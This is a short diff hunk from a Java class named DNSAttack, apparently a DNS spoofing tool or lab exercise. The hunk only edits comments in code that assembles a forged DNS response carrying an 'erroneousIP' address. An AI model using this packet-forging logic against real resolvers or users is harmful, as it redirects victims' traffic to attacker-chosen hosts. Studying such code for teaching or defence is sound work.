@@ -54,11 +54,11 @@ public class DNSAttack {
         int urlLength = parseDNSQueryURL(dnsQuery).length() + 1;
         byte[] answer = new byte[urlLength + 33];
         System.arraycopy(dnsQuery, 0, answer, 0, 2);  // ID
-        System.arraycopy(headerWithoutId, 0, answer, 2, 10 /* headerWithoutId.length() */);
+        System.arraycopy(headerWithoutId, 0, answer, 2, 10 /* headerWithoutId.length */);
         System.arraycopy(dnsQuery, 12, answer, 12, urlLength + 5); // Query [URL + URL terminator (0x00) + QType (16 bits) + QClass (16 bits)]
-        System.arraycopy(answerSectionBegin, 0, answer, urlLength + 17, 6);
-        System.arraycopy(answerSectionTTL, 0, answer, urlLength + 23, 4);
-        System.arraycopy(answerSectionIpLength, 0, answer, urlLength + 27, 2);
+        System.arraycopy(answerSectionBegin, 0, answer, urlLength + 17, 6 /* answerSectionBegin.length */);
+        System.arraycopy(answerSectionTTL, 0, answer, urlLength + 23, 4 /* answerSectionTTL.length */);
+        System.arraycopy(answerSectionIpLength, 0, answer, urlLength + 27, 2 /* answerSectionIpLength.length */);
         String[] ipParts = erroneousIP.split("\\.");
         for (int i = 0; i < ipParts.length; i++)
             answer[urlLength + 29 + i] = (byte) (Integer.parseInt(ipParts[i]));
